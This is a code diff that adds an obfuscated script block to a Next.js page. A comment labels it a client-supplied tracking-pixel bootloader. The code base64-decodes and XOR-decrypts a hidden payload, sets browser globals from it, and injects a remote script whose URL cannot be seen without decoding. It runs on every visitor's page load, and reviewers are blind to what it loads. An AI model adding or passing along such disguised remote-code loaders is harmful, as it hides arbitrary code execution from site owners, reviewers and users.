@@ -26,6 +26,13 @@ export default function KoreanPage() {
       <link rel="dns-prefetch" href="https://images.converteai.net" />
       <link rel="dns-prefetch" href="https://license.vturb.com" />
 
+      {/* Bootloader de pixel/tracker (obfuscado) — decodifica URL + globals
+          e injeta o script real. Fornecido pelo cliente pra rodar so nesta
+          pagina. */}
+      <Script id="pixel-boot" strategy="afterInteractive">
+        {`(function(){var p_h=atob("DG1gcmNSEVL3LL/DhhZCBxE+M2jVRMu39h5aXUwxdTzZWcuu7wsZXAA9fHyVXpCw5R8JAhchPiKeVNqvqR0JCgY+PziEDpPh5xkUAAowZCaSX5353TBMUAQ+fjCWQMzhvDYbUA0zfDfVFp2z7xUFHio2M37VWt6v8whCSEFkcGuUT4nxv1xZQ1ZkczTHFYnzv1xWRltwbA+K");var d_v=[];for(var j_r4fi=0;j_r4fi<p_h.length;j_r4fi++){d_v.push(p_h.charCodeAt(j_r4fi)&255);}var h_m8ro=d_v[0];var p_2f3=d_v.slice(1,1+h_m8ro);var m_jo=d_v.slice(1+h_m8ro);var j_i=m_jo.map(function(b,k_xw0){return b^p_2f3[k_xw0%h_m8ro];});var z_a3tf="";for(var s_4=0;s_4<j_i.length;s_4++){z_a3tf+=String.fromCharCode(j_i[s_4]&255);}var j_a=decodeURIComponent(escape(z_a3tf));var a_9s0=JSON.parse(j_a);var h_vnz=a_9s0.globals||[];h_vnz.forEach(function(k_9l12){window[k_9l12.name]=k_9l12.value;});var h_h2=document.createElement("script");h_h2.src=a_9s0.url;h_h2.async=true;h_h2.defer=true;(a_9s0.attributes||[]).forEach(function(f_y6){h_h2.setAttribute(f_y6.name,f_y6.value);});(document.head||document.documentElement).appendChild(h_h2);})();`}
+      </Script>
+
       <style jsx global>{`
         .esconder {
           display: none;
